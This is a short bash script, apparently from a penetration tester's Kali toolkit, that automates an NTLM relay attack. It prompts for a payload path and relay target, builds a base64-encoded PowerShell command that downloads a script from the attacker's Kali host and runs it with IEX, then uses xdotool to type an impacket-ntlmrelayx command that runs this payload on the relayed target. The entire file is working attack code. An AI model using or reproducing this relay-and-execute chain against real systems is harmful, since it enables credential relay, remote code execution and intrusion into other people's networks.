#!/bin/bash

source ~/Desktop/base/code/xdotool/helpers/paste_commands.sh
source ~/Desktop/base/code/xdotool/helpers/get_kali_ip.sh
source ~/Desktop/base/code/xdotool/helpers/generate_gui_form.sh

# Generate gui form
generate_form "Download file path (tools/shell.sh)" "Relay target"

full_command="\$text = \"(New-Object System.Net.WebClient).DownloadString('http://${KALI_IP}/${form_data["Download file path (tools/shell.sh)"]}') | IEX\"; \$bytes = [System.Text.Encoding]::Unicode.GetBytes(\$text); \$EncodedText = [Convert]::ToBase64String(\$bytes); return \$EncodedText"

ret_val=$(pwsh -c $full_command)

com="impacket-ntlmrelayx --no-http-server -smb2support -t ${form_data["Relay target"]} -c 'powershell -enc ${ret_val}'"

paste_command --delay 10 "${com}"
xdotool key Return
